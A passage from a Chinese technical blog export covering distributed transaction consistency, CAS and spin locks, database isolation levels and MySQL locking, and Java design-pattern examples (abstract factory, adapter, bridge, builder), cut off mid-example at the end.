<p>当然，你也可以不保存中间状态，简单一点，你也可以只设置2个状态：Init&#x2F;Success，或者说begin&#x2F;end。</p>
<p>然后有个后台任务，发现某条流水，在过了某个时间之后(假设1次事务执行成功通常最多花费30s)，状态仍然是Init，那就说明这条流水有问题。就重新调用系统A，系统B，保证这条流水的最终状态是Success。当然，系统A, 系统B根据这个全局的事务ID，做幂等，所以重复调用也没关系。</p>
<p>这就是通过同步调用 + 后台任务异步补偿，最终保证系统一致性。</p>
<p>补充说明：</p>
<p>（1）如果后台任务重试多次，仍然不能成功，那要为状态表加1个Error状态，要人工介入干预了。</p>
<p>（2）对于调用方的同步调用，如果部分成功，此时给客户端返回什么呢？</p>
<p>答案是不确定，或者说暂时未知。你只能告诉用户，该笔转账超时，稍后再来确认。</p>
<p>（3）对于同步调用，调用方调用A，或者B失败的时候，可以重试3次。重试3次还不成功，放弃操作。再交由后台任务后续处理。</p>
<h2 id="方案4的扩展：状态机-对账"><a href="#方案4的扩展：状态机-对账" class="headerlink" title="方案4的扩展：状态机 + 对账"></a>方案4的扩展：状态机 + 对账</h2><p>把方案4扩展一下，岂止事务有状态，系统中的各种数据对象都有状态，或者说都有各自完整的生命周期。</p>
<p>这种完整的生命周期，天生就具有校验功能！！！我们可以很好的利用这个特性，来实行系统的一致性。</p>
<p>一旦我们发现系统中的某个数据对象，过了一个限定时间，生命周期仍然没有走完，仍然处在某个中间状态，那就说明系统不一致了，可以执行某种操作。</p>
<p>举个电商系统的订单的例子：一张订单，从“已支付”，到“下发给仓库”，到“出仓完成”。假定从“已支付”到“下发给仓库”，最多用1个小时；从“下发给仓库”到“出仓完成”，最多用8个小时。</p>
<p>那意味着：只要我发现1个订单的状态，过了1个小时之后，还是“已支付”，我就认为订单下发没有成功，我就重新下发，也就是上面所说的“重试”；</p>
<p>同样，只要我发现订单过了8个小时，还未出仓，我这个时候可能就会发报警出来，是不是仓库的作业系统出了问题。。。诸如此类。</p>
<p>更复杂一点：订单有状态，库存系统的库存也有状态，优惠系统的优惠券也有状态，根据业务规则，这些状态之间进行比对，就能发现系统某个地方不一致，做相应的补偿行为。</p>
<p>上面说的“最终一致性”和TCC、状态机+对账，都是比较“完美”的方案，能完全保证数据的一致性。</p>
<p>但是呢，最终一致性这个方案是异步的；</p>
<p>TCC需要2个阶段，性能损耗大；</p>
<p>事务状态表，或者状态机，每次要记事务流水，要更新状态，性能也有损耗。</p>
<p>如果我需要1个同步的方案，可以立马得到结果，同时又要有很高的性能，支持高并发，那怎么处理呢？</p>
<h2 id="方案5：妥协方案-–-弱一致性-基于状态的补偿"><a href="#方案5：妥协方案-–-弱一致性-基于状态的补偿" class="headerlink" title="方案5：妥协方案 – 弱一致性 + 基于状态的补偿"></a>方案5：妥协方案 – 弱一致性 + 基于状态的补偿</h2><p>举个典型场景：</p>
<p>电商网站的下单，扣库存。订单系统有订单的DB，订单的服务；库存系统有库存的DB，库存的服务。 如何保证下单 + 扣库存，2个的原子性呢？</p>
<p>如果用上面的最终一致性方案，因为是异步的，库存扣减不及时，会导致超卖，因此最终一致性的方案不可行；</p>
<p>如果用TCC的方案，性能可能又达不到。</p>
<p>这里，就采用了一种弱一致的方案，什么意思呢？</p>
<p>对于该需求，有1个关键特性：对于电商的购物来讲，允许少卖，但不能超卖。你有100件东西，卖给99个人，有1件没有卖出去，这个可以接受；但是卖给了101个人，其中1个人拿不到货，平台违约，这个就不能接受。</p>
<p>而该处就利用了这个特性，具体是这么做的：</p>
<p>先扣库存，再提交订单。</p>
<p>（1）扣库存失败，不提交订单了，直接返回失败，调用方重试（此处可能会多扣库存）</p>
<p>（2）扣库存成功，提交订单失败，返回失败，调用方重试（此处可能会多扣库存）</p>
<p>（3）扣库存成功，提交订单成功，返回成功。</p>
<p>反过来，你先提交订单，后扣库存，也是按照类似的这个思路。</p>
<p>最终，只要保证1点：库存可以多扣，不能少扣！！！</p>
<p>但是，库存多扣了，这个数据不一致，怎么补偿呢？</p>
<p>库存每扣1次，都会生成1条流水记录。这条记录的初始状态是“占用”，等订单支付成功之后，会把状态改成“释放”。</p>
<p>对于那些过了很长时间，一直是占用，而不释放的库存。要么是因为前面多扣造成的，要么是因为用户下了单，但不支付。</p>
<p>通过比对，库存系统的“占用又没有释放的库存流水“与订单系统的未支付的订单，我们就可以回收掉这些库存，同时把对应的订单取消掉。（就类似12306网站一样，过多长时间，你不支付，订单就取消了，库存释放）</p>
<h2 id="方案6：-妥协方案-–-重试-回滚-监控报警-人工修复"><a href="#方案6：-妥协方案-–-重试-回滚-监控报警-人工修复" class="headerlink" title="方案6： 妥协方案 – 重试 + 回滚 + 监控报警 + 人工修复"></a>方案6： 妥协方案 – 重试 + 回滚 + 监控报警 + 人工修复</h2><p>对于方案5，我们是基于订单的状态 + 库存流水的状态，做补偿（或者说叫对账）。</p>
<p>如果业务很复杂，状态的维护也很复杂。方案5呢，就是1种更加妥协而简单的办法。</p>
<p>提交订单不是失败了嘛！</p>
<p>先重试！</p>
<p>重试还不成功，回滚库存的扣减！</p>
<p>回滚也失败，发报警出来，人工干预修复！</p>
<p>总之，根据业务逻辑，通过重试3次，或者回滚的办法，尽最大限度，保证一致。实在不一致，就发报警，让人工干预。只要日志流水记录的完整，人工肯定可以修复！ （通常只要业务逻辑本身没问题，重试、回滚之后，还失败的概率会比较低，所以这种办法虽然丑陋，但蛮实用）</p>
<p>后话</p>
<p>其他的，诸如状态机驱动、1PC之类的办法，只是说法不一，个人认为本质上都是方案4&#x2F;方案5的做法。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在上文中，总结了实践中比较靠谱的6种方法：2种最终一致性的方案，2种妥协办法，2种基于状态 + 重试的方法（TCC，状态机 + 重试 + 幂等）。</p>
<p>实现层面，妥协的办法肯定最容易，TCC最复杂。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>一致性</category>
      </categories>
      <tags>
        <tag>架构</tag>
        <tag>一致性</tag>
        <tag>CAP</tag>
        <tag>并发</tag>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title>【CAP】JAVA之AtomicReference非锁同步</title>
    <url>/blog/arch/cap/atomicrefer/</url>
    <content><![CDATA[<p>并发最简单的竞态问题是操作一个基本变量，如一个整数。</p>
<p>复杂问题是同时操作多个变量，要保证变量的结果一致，比如A加1那B就要减1。</p>
<p>简单问题和复杂问题都可以通过锁来实现。</p>
<p>用锁划出临界区（一段代码），这段代码通过锁保证不能被并行执行。</p>
<p>代码就是对竞态数据的逻辑操作，并且只能通过这段代码操作竞态数据。</p>
<p>CAS提供了另一种解决竞态问题的方案。</p>
<h2 id="AtomicReference解决竞态问题"><a href="#AtomicReference解决竞态问题" class="headerlink" title="AtomicReference解决竞态问题"></a>AtomicReference解决竞态问题</h2><p>比如A加1那B就要减1的问题，可以把A和B做成一个对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AtomicReference&lt;AB&gt; data = new AtomicReference&lt;AB&gt;();</span><br></pre></td></tr></table></figure>

<p>每个线程复制一份data,操作完后通过compareAndSet设置到公共变量。</p>
<p>可以参考AtomicInteger加1的操作：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public final int incrementAndGet() &#123;</span><br><span class="line">    for (;;) &#123;</span><br><span class="line">        int current = get();</span><br><span class="line">        int next = current + 1;</span><br><span class="line">        if (compareAndSet(current, next))</span><br><span class="line">            return next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以封装个AtomicAB类来完成这件事，复制data到ThreadLocal中，修改完后再写加公共data对象。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>一致性</category>
      </categories>
      <tags>
        <tag>一致性</tag>
        <tag>并发</tag>
        <tag>JAVA</tag>
        <tag>锁</tag>
        <tag>CAS</tag>
      </tags>
  </entry>
  <entry>
    <title>【CAP】CPU密集型与IO密集型</title>
    <url>/blog/arch/cap/cpuio/</url>
    <content><![CDATA[<p>如何控制并发量，区分任务类型是第一因素。</p>
<p>###CPU密集型（CPU-bound）</p>
<p>CPU密集型也叫计算密集型，指的是系统的硬盘、内存性能相对CPU要好很多，此时，系统运作大部分的状况是CPU Loading 100%，CPU要读&#x2F;写I&#x2F;O(硬盘&#x2F;内存)，I&#x2F;O在很短的时间就可以完成，而CPU还有许多运算要处理，CPU Loading很高。</p>
<p>在多重程序系统中，大部份时间用来做计算、逻辑判断等CPU动作的程序称之CPU bound。例如一个计算圆周率至小数点一千位以下的程序，在执行的过程当中绝大部份时间用在三角函数和开根号的计算，便是属于CPU bound的程序。</p>
<p>CPU bound的程序一般而言CPU占用率相当高。这可能是因为任务本身不太需要访问I&#x2F;O设备，也可能是因为程序是多线程实现因此屏蔽掉了等待I&#x2F;O的时间。</p>
<p>###IO密集型（I&#x2F;O bound）</p>
<p>IO密集型指的是系统的CPU性能相对硬盘、内存要好很多，此时，系统运作，大部分的状况是CPU在等I&#x2F;O (硬盘&#x2F;内存) 的读&#x2F;写操作，此时CPU Loading并不高。</p>
<p>I&#x2F;O bound的程序一般在达到性能极限时，CPU占用率仍然较低。这可能是因为任务本身需要大量I&#x2F;O操作，而pipeline做得不是很好，没有充分利用处理器能力。</p>
<p>###CPU密集型 vs IO密集型</p>
<p>我们可以把任务分为计算密集型和IO密集型。</p>
<p>计算密集型任务的特点是要进行大量的计算，消耗CPU资源，比如计算圆周率、对视频进行高清解码等等，全靠CPU的运算能力。这种计算密集型任务虽然也可以用多任务完成，但是任务越多，花在任务切换的时间就越多，CPU执行任务的效率就越低，所以，要最高效地利用CPU，计算密集型任务同时进行的数量应当等于CPU的核心数。</p>
<p>第二种任务的类型是IO密集型，涉及到网络、磁盘IO的任务都是IO密集型任务，这类任务的特点是CPU消耗很少，任务的大部分时间都在等待IO操作完成（因为IO的速度远远低于CPU和内存的速度）。对于IO密集型任务，任务越多，CPU效率越高，但也有一个限度。常见的大部分任务都是IO密集型任务，比如Web应用。</p>
<p>IO密集型任务执行期间，99%的时间都花在IO上，花在CPU上的时间很少，因此，用运行速度极快的C语言替换用Python这样运行速度极低的脚本语言，完全无法提升运行效率。</p>
]]></content>
      <categories>
        <category>架构</category>
      </categories>
      <tags>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>【CAP】CAS和自旋锁</title>
    <url>/blog/arch/cap/cas/</url>
    <content><![CDATA[<p>自旋锁可以看成是不断自动重试的乐观锁，也会有乐观锁的ABA问题。</p>
<p>自旋锁的实现基础是CAS功能。</p>
<h2 id="什么是自旋锁？"><a href="#什么是自旋锁？" class="headerlink" title="什么是自旋锁？"></a>什么是自旋锁？</h2><p>自旋锁（spinlock）：是指当一个线程在获取锁的时候，如果锁已经被其它线程获取，那么该线程将循环等待，然后不断的判断锁是否能够被成功获取，直到获取到锁才会退出循环。</p>
<p>获取锁的线程一直处于活跃状态，但是并没有执行任何有效的任务，使用这种锁会造成busy-waiting。</p>
<p>它是为实现保护共享资源而提出一种锁机制。其实，自旋锁与互斥锁比较类似，它们都是为了解决对某项资源的互斥使用。无论是互斥锁，还是自旋锁，在任何时刻，最多只能有一个保持者，也就说，在任何时刻最多只能有一个执行单元获得锁。</p>
<p>两者在调度机制上略有不同。对于互斥锁，如果资源已经被占用，资源申请者只能进入睡眠状态。但是自旋锁不会引起调用者睡眠，如果自旋锁已经被别的执行单元保持，调用者就一直循环在那里看是否该自旋锁的保持者已经释放了锁，”自旋”一词就是因此而得名。</p>
<h2 id="什么是CAS"><a href="#什么是CAS" class="headerlink" title="什么是CAS"></a>什么是CAS</h2><p>CAS（Compare-and-Swap），即比较并替换，是一种实现并发算法时常用到的技术，Java并发包中的很多类都使用了CAS技术。</p>
<p>这里以AtomicInteger说明一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public final int incrementAndGet() &#123;</span><br><span class="line">    for (;;) &#123;</span><br><span class="line">        int current = get();</span><br><span class="line">        int next = current + 1;</span><br><span class="line">        if (compareAndSet(current, next))</span><br><span class="line">            return next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加1就是先获取当前值，加1，设置时先对比当前值是不是内存中的值，如果是设置新值。</p>
<p>内存对比是通过本地方法实现的，需要操作系统的支持。</p>
<p>如果成功就可以退出循环，否则一直尝试。</p>
<h2 id="用AtomicReference实现自旋锁"><a href="#用AtomicReference实现自旋锁" class="headerlink" title="用AtomicReference实现自旋锁"></a>用AtomicReference实现自旋锁</h2><p>自旋锁就是线程调用lock()后，其他线程再调用lock()会卡住，等待锁的释放。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class SpinLock &#123;</span><br><span class="line">    private AtomicReference&lt;Thread&gt; lock = new AtomicReference&lt;Thread&gt;();</span><br><span class="line">    public void lock() &#123;</span><br><span class="line">        Thread current = Thread.currentThread();</span><br><span class="line">        // 利用CAS</span><br><span class="line">        while (!lock.compareAndSet(null, current)) &#123;</span><br><span class="line">            // DO nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public void unlock() &#123;</span><br><span class="line">        Thread current = Thread.currentThread();</span><br><span class="line">        lock.compareAndSet(current, null);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，第一个线程调用lock()时lock没有set过值，对象是null，第二个线程在调用时已经set过值，所以会一直循环。</p>
<p>只有当第一个线程unlock()之后第二个循环才能结束。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>一致性</category>
      </categories>
      <tags>
        <tag>一致性</tag>
        <tag>并发</tag>
        <tag>JAVA</tag>
        <tag>锁</tag>
        <tag>CAS</tag>
      </tags>
  </entry>
  <entry>
    <title>【CAP】数据库的竞态问题</title>
    <url>/blog/arch/cap/dblock/</url>
    <content><![CDATA[<p>有并发就有竞态，就有锁的问题。</p>
<p>最基本的是数据库的竞态问题。</p>
<h2 id="一、脏读、不可重复读、幻读"><a href="#一、脏读、不可重复读、幻读" class="headerlink" title="一、脏读、不可重复读、幻读"></a>一、脏读、不可重复读、幻读</h2><p>1、脏读：脏读就是指当一个事务正在访问数据，并且对数据进行了修改，而这种修改还没有提交到数据库中，这时，另外一个事务也访问这个数据，然后使用了这个数据。</p>
<p>例如：</p>
<p>张三的工资为5000,事务A中把他的工资改为8000,但事务A尚未提交。</p>
<p>与此同时，事务B正在读取张三的工资，读取到张三的工资为8000。</p>
<p>随后，事务A发生异常，而回滚了事务。张三的工资又回滚为5000。</p>
<p>最后，事务B读取到的张三工资为8000的数据即为脏数据，事务B做了一次脏读。</p>
<p>2、不可重复读：是指在一个事务内，多次读同一数据。在这个事务还没有结束时，另外一个事务也访问该同一数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改，那么第一个事务两次读到的的数据可能是不一样的。这样就发生了在一个事务内两次读到的数据是不一样的，因此称为是不可重复读。</p>
<p>例如：</p>
<p>在事务A中，读取到张三的工资为5000，操作没有完成，事务还没提交。</p>
<p>与此同时，事务B把张三的工资改为8000，并提交了事务。</p>
<p>随后，在事务A中，再次读取张三的工资，此时工资变为8000。在一个事务中前后两次读取的结果并不致，导致了不可重复读。</p>
<p>3、幻读：是指当事务不是独立执行时发生的一种现象，例如第一个事务对一个表中的数据进行了修改，这种修改涉及到表中的全部数据行。同时，第二个事务也修改这个表中的数据，这种修改是向表中插入一行新数据。那么，以后就会发生操作第一个事务的用户发现表中还有没有修改的数据行，就好象发生了幻觉一样。</p>
<p>例如：</p>
<p>目前工资为5000的员工有10人，事务A读取所有工资为5000的人数为10人。</p>
<p>此时，事务B插入一条工资也为5000的记录。</p>
<p>这是，事务A再次读取工资为5000的员工，记录为11人。此时产生了幻读。</p>
<p>4、提醒</p>
<p>不可重复读的重点是修改：</p>
<p>同样的条件，你读取过的数据，再次读取出来发现值不一样了</p>
<p>幻读的重点在于新增或者删除：</p>
<p>同样的条件，第 1 次和第 2 次读出来的记录数不一样</p>
<h2 id="二、独占锁、共享锁、更新锁，乐观锁、悲观锁"><a href="#二、独占锁、共享锁、更新锁，乐观锁、悲观锁" class="headerlink" title="二、独占锁、共享锁、更新锁，乐观锁、悲观锁"></a>二、独占锁、共享锁、更新锁，乐观锁、悲观锁</h2><p>1、锁的两种分类方式</p>
<p>###（1）从数据库系统的角度来看，锁分为以下三种类型：</p>
<p> 独占锁（Exclusive Lock）</p>
<p>独占锁锁定的资源只允许进行锁定操作的程序使用，其它任何对它的操作均不会被接受。执行数据更新命令，即INSERT、 UPDATE 或DELETE 命令时，数据库会自动使用独占锁。但当对象上有其它锁存在时，无法对其加独占锁。独占锁一直到事务结束才能被释放。</p>
<p>共享锁（Shared Lock）</p>
<p>共享锁锁定的资源可以被其它用户读取，但其它用户不能修改它。在SELECT 命令执行时，数据库通常会对对象进行共享锁锁定。通常加共享锁的数据页被读取完毕后，共享锁就会立即被释放。</p>
<p>更新锁（Update Lock）</p>
<p>更新锁是为了防止死锁而设立的。当数据库准备更新数据时，它首先对数据对象作更新锁锁定，这样数据将不能被修改，但可以读取。等到数据库确定要进行更新数据操作时，它会自动将更新锁换为独占锁。但当对象上有其它锁存在时，无法对其作更新锁锁定。</p>
<p>###（2）从程序员的角度看，锁分为以下两种类型：</p>
<p>悲观锁（Pessimistic Lock）</p>
<p>悲观锁，正如其名，它指的是对数据被外界（包括本系统当前的其他事务，以及来自外部系统的事务处理）修改持保守态度，因此在整个数据处理过程中，将数据处于锁定状态。悲观锁的实现，往往依靠数据库提供的锁机制（也只有数据库层提供的锁机制才能真正保证数据访问的排他性，否则，即使在本系统中实现了加锁机制，也无法保证外部系统不会修改数据）。</p>
<p>乐观锁（Optimistic Lock）</p>
<p>相对悲观锁而言，乐观锁机制采取了更加宽松的加锁机制。悲观锁大多数情况下依靠数据库的锁机制实现，以保证操作最大程度的独占性。但随之而来的就是数据库性能的大量开销，特别是对长事务而言，这样的开销往往无法承受。</p>
<p>而乐观锁机制在一定程度上解决了这个问题。乐观锁，大多是基于数据版本（ Version ）记录机制实现。何谓数据版本？即为数据增加一个版本标识，在基于数据库表的版本解决方案中，一般是通过为数据库表增加一个 “version” 字段来实现。读取出数据时，将此版本号一同读出，之后更新时，对此版本号加一。此时，将提交数据的版本数据与数据库表对应记录的当前版本信息进行比对，如果提交的数据版本号大于数据库表当前版本号，则予以更新，否则认为是过期数据。</p>
<h2 id="三、事务五种隔离级别"><a href="#三、事务五种隔离级别" class="headerlink" title="三、事务五种隔离级别"></a>三、事务五种隔离级别</h2><p>在竞态数据对不同事务的可见性。</p>
<p>Isolation 属性一共支持五种事务设置，具体介绍如下：</p>
<p>（1）DEFAULT</p>
<p>使用数据库设置的隔离级别（默认），由DBA 默认的设置来决定隔离级别。</p>
<p>（2）READ_UNCOMMITTED</p>
<p>这是事务最低的隔离级别，它充许别外一个事务可以看到这个事务未提交的数据。</p>
<p>会出现脏读、不可重复读、幻读 （隔离级别最低，并发性能高）。</p>
<p>（3）READ_COMMITTED</p>
<p>保证一个事务修改的数据提交后才能被另外一个事务读取。另外一个事务不能读取该事务未提交的数据。</p>
<p>可以避免脏读，但会出现不可重复读、幻读问题（锁定正在读取的行）。</p>
<p>（4）REPEATABLE_READ</p>
<p>可以防止脏读、不可重复读，但会出幻读（锁定所读取的所有行）。</p>
<p>（5）SERIALIZABLE</p>
<p>这是花费最高代价但是最可靠的事务隔离级别，事务被处理为顺序执行。</p>
<p>保证所有的情况不会发生（锁表）。</p>
<h3 id="MYSQL悲观锁的使用"><a href="#MYSQL悲观锁的使用" class="headerlink" title="MYSQL悲观锁的使用"></a>MYSQL悲观锁的使用</h3><p>要使用悲观锁，我们必须关闭mysql数据库的自动提交属性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set autocommit=0;　　</span><br><span class="line">//设置完autocommit后，我们就可以执行我们的正常业务了。具体如下：</span><br><span class="line">//0.开始事务</span><br><span class="line">begin;/begin work;/start transaction; (三者选一就可以)</span><br><span class="line">//1.查询出商品信息</span><br><span class="line">select status from t_goods where id=1 for update;</span><br><span class="line">//2.根据商品信息生成订单</span><br><span class="line">insert into t_orders (id,goods_id) values (null,1);</span><br><span class="line">//3.修改商品status为2</span><br><span class="line">update t_goods set status=2;</span><br><span class="line">//4.提交事务</span><br><span class="line">commit;/commit work;</span><br></pre></td></tr></table></figure>

<p>上面的第一步我们执行了一次查询操作：select status from t_goods where id&#x3D;1 for update;与普通查询不一样的是，我们使用了select…for update的方式，这样就通过数据库实现了悲观锁。此时在t_goods表中，id为1的那条数据就被我们锁定了，其它的事务必须等本次事务提交之后才能执行。这样我们可以保证当前的数据不会被其它事务修改。</p>
<p>使用select…for update会把数据给锁住，不过我们需要注意一些锁的级别，MySQL InnoDB默认Row-Level Lock，所以只有「明确」地指定主键，MySQL 才会执行Row lock (只锁住被选取的数据) ，否则MySQL 将会执行Table Lock (将整个数据表单给锁住)。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>一致性</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>一致性</tag>
        <tag>并发</tag>
        <tag>锁</tag>
      </tags>
  </entry>
  <entry>
    <title>抽象工厂模式（Abstract Factory）</title>
    <url>/blog/arch/dp/abfactory/</url>
    <content><![CDATA[<p>工厂方法模式有一个问题就是，类的创建依赖工厂类，也就是说，如果想要拓展程序，必须对工厂类进行修改，这违背了闭包原则，所以，从设计角度考虑，有一定的问题，如何解决？就用到抽象工厂模式，创建多个工厂类，这样一旦需要增加新的功能，直接增加新的工厂类就可以了，不需要修改之前的代码。因为抽象工厂不太好理解，我们先看看图，然后就和代码，就比较容易理解。</p>
<p><img src="/images/design/dpabfactory.png"></p>
<p>请看例子：</p>
<pre><code>public interface Sender &#123;
    public void Send();
&#125;

public class MailSender implements Sender &#123;
    @Override
    public void Send() &#123;
        System.out.println(&quot;this is mailsender!&quot;);
    &#125;
&#125;

public class SmsSender implements Sender &#123;

    @Override
    public void Send() &#123;
        System.out.println(&quot;this is sms sender!&quot;);
    &#125;
&#125;
</code></pre>
<p>两个工厂类：</p>
<pre><code>public interface Provider &#123;
    public Sender produce();
&#125;

public class SendMailFactory implements Provider &#123;
    
    @Override
    public Sender produce()&#123;
        return new MailSender();
    &#125;
&#125;

public class SendSmsFactory implements Provider&#123;

    @Override
    public Sender produce() &#123;
        return new SmsSender();
    &#125;
&#125;
</code></pre>
<p>测试类：</p>
<pre><code>public class Test &#123;

    public static void main(String[] args) &#123;
        Provider provider = new SendMailFactory();
        Sender sender = provider.produce();
        sender.Send();
    &#125;
&#125;
</code></pre>
<p>其实这个模式的好处就是，如果你现在想增加一个功能：发及时信息，则只需做一个实现类，实现Sender接口，同时做一个工厂类，实现Provider接口，就OK了，无需去改动现成的代码。这样做，拓展性较好！</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>适配器模式（Adapter）</title>
    <url>/blog/arch/dp/adapter/</url>
    <content><![CDATA[<h3 id="类的适配器模式"><a href="#类的适配器模式" class="headerlink" title="类的适配器模式"></a>类的适配器模式</h3><p>适配器模式将某个类的接口转换成客户端期望的另一个接口表示，目的是消除由于接口不匹配所造成的类的兼容性问题。主要分为三类：类的适配器模式、对象的适配器模式、接口的适配器模式。首先，我们来看看类的适配器模式，先看类图：</p>
<p><img src="/images/design/dpadp1.png"></p>
<p>核心思想就是：有一个Source类，拥有一个方法，待适配，目标接口时Targetable，通过Adapter类，将Source的功能扩展到Targetable里，看代码：</p>
<pre><code>public class Source &#123;

    public void method1() &#123;
        System.out.println(&quot;this is original method!&quot;);
    &#125;
&#125;

public interface Targetable &#123;

    /* 与原类中的方法相同 */
    public void method1();

    /* 新类的方法 */
    public void method2();
&#125;

public class Adapter extends Source implements Targetable &#123;

    @Override
    public void method2() &#123;
        System.out.println(&quot;this is the targetable method!&quot;);
    &#125;
&#125;

public class AdapterTest &#123;

    public static void main(String[] args) &#123;
        Targetable target = new Adapter();
        target.method1();
        target.method2();
    &#125;
&#125;
</code></pre>
<p>这样Targetable接口的实现类就具有了Source类的功能。</p>
<h3 id="对象的适配器模式"><a href="#对象的适配器模式" class="headerlink" title="对象的适配器模式"></a>对象的适配器模式</h3><p>基本思路和类的适配器模式相同，只是将Adapter类作修改，这次不继承Source类，而是持有Source类的实例，以达到解决兼容性的问题。看图：</p>
<p><img src="/images/design/dpadp2.png"></p>
<p>只需要修改Adapter类的源码即可：</p>
<pre><code>public class Wrapper implements Targetable &#123;

    private Source source;
    
    public Wrapper(Source source)&#123;
        super();
        this.source = source;
    &#125;
    @Override
    public void method2() &#123;
        System.out.println(&quot;this is the targetable method!&quot;);
    &#125;

    @Override
    public void method1() &#123;
        source.method1();
    &#125;
&#125;

public class AdapterTest &#123;

    public static void main(String[] args) &#123;
        Source source = new Source();
        Targetable target = new Wrapper(source);
        target.method1();
        target.method2();
    &#125;
&#125;
</code></pre>
<p>输出与第一种一样，只是适配的方法不同而已。</p>
<h3 id="接口的适配器模式"><a href="#接口的适配器模式" class="headerlink" title="接口的适配器模式"></a>接口的适配器模式</h3><p>第三种适配器模式是接口的适配器模式，接口的适配器是这样的：有时我们写的一个接口中有多个抽象方法，当我们写该接口的实现类时，必须实现该接口的所有方法，这明显有时比较浪费，因为并不是所有的方法都是我们需要的，有时只需要某一些，此处为了解决这个问题，我们引入了接口的适配器模式，借助于一个抽象类，该抽象类实现了该接口，实现了所有的方法，而我们不和原始的接口打交道，只和该抽象类取得联系，所以我们写一个类，继承该抽象类，重写我们需要的方法就行。看一下类图：</p>
<p><img src="/images/design/dpadp3.png"></p>
<p>这个很好理解，在实际开发中，我们也常会遇到这种接口中定义了太多的方法，以致于有时我们在一些实现类中并不是都需要。看代码：</p>
<pre><code>public interface Sourceable &#123;
    
    public void method1();
    public void method2();
&#125;

public abstract class Wrapper2 implements Sourceable&#123;
    
    public void method1()&#123;&#125;
    public void method2()&#123;&#125;
&#125;

public class SourceSub1 extends Wrapper2 &#123;
    public void method1()&#123;
        System.out.println(&quot;the sourceable interface&#39;s first Sub1!&quot;);
    &#125;
&#125;

public class SourceSub2 extends Wrapper2 &#123;
    public void method2()&#123;
        System.out.println(&quot;the sourceable interface&#39;s second Sub2!&quot;);
    &#125;
&#125;

public class WrapperTest &#123;

    public static void main(String[] args) &#123;
        Sourceable source1 = new SourceSub1();
        Sourceable source2 = new SourceSub2();
        
        source1.method1();
        source1.method2();
        source2.method1();
        source2.method2();
    &#125;
&#125;
&#125;
</code></pre>
<p>讲了这么多，总结一下三种适配器模式的应用场景：</p>
<p>类的适配器模式：当希望将一个类转换成满足另一个新接口的类时，可以使用类的适配器模式，创建一个新类，继承原有的类，实现新的接口即可。对象的适配器模式：当希望将一个对象转换成满足另一个新接口的对象时，可以创建一个Wrapper类，持有原类的一个实例，在Wrapper类的方法中，调用实例的方法就行。</p>
<p>接口的适配器模式：当不希望实现一个接口中所有的方法时，可以创建一个抽象类Wrapper，实现所有方法，我们写别的类的时候，继承抽象类即可。</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>桥接模式（Bridge）</title>
    <url>/blog/arch/dp/bridge/</url>
    <content><![CDATA[<p>桥接模式就是把事物和其具体实现分开，使他们可以各自独立的变化。桥接的用意是：将抽象化与实现化解耦，使得二者可以独立变化，像我们常用的JDBC桥DriverManager一样，JDBC进行连接数据库的时候，在各个数据库之间进行切换，基本不需要动太多的代码，甚至丝毫不用动，原因就是JDBC提供统一接口，每个数据库提供各自的实现，用一个叫做数据库驱动的程序来桥接就行了。我们来看看关系图：</p>
<p><img src="/images/design/dpbridge1.png"></p>
<p>实现代码：</p>
<pre><code>public interface Sourceable &#123;
    public void method();
&#125;

public class SourceSub1 implements Sourceable &#123;

    @Override
    public void method() &#123;
        System.out.println(&quot;this is the first sub!&quot;);
    &#125;
&#125;

public class SourceSub2 implements Sourceable &#123;

    @Override
    public void method() &#123;
        System.out.println(&quot;this is the second sub!&quot;);
    &#125;
&#125;

public abstract class Bridge &#123;
    private Sourceable source;

    public void method()&#123;
        source.method();
    &#125;
    
    public Sourceable getSource() &#123;
        return source;
    &#125;

    public void setSource(Sourceable source) &#123;
        this.source = source;
    &#125;
&#125;

public class MyBridge extends Bridge &#123;
    public void method()&#123;
        getSource().method();
    &#125;
&#125;

public class BridgeTest &#123;
    
    public static void main(String[] args) &#123;
        
        Bridge bridge = new MyBridge();
        
        /*调用第一个对象*/
        Sourceable source1 = new SourceSub1();
        bridge.setSource(source1);
        bridge.method();
        
        /*调用第二个对象*/
        Sourceable source2 = new SourceSub2();
        bridge.setSource(source2);
        bridge.method();
    &#125;
&#125;
</code></pre>
<p>这样，就通过对Bridge类的调用，实现了对接口Sourceable的实现类SourceSub1和SourceSub2的调用。接下来我再画个图，大家就应该明白了，因为这个图是我们JDBC连接的原理，有数据库学习基础的，一结合就都懂了。</p>
<p><img src="/images/design/dpbridge2.png"></p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>建造者模式（Builder）</title>
    <url>/blog/arch/dp/builder/</url>
    <content><![CDATA[<p>工厂类模式提供的是创建单个类的模式，而建造者模式则是将各种产品集中起来进行管理，用来创建复合对象，所谓复合对象就是指某个类具有不同的属性，其实建造者模式就是前面抽象工厂模式和最后的Test结合起来得到的。我们看一下代码：</p>
<pre><code>public class Builder &#123;
    
    private List list = new ArrayList();
    
    public void produceMailSender(int count)&#123;
        for(int i=0; i
</code></pre>
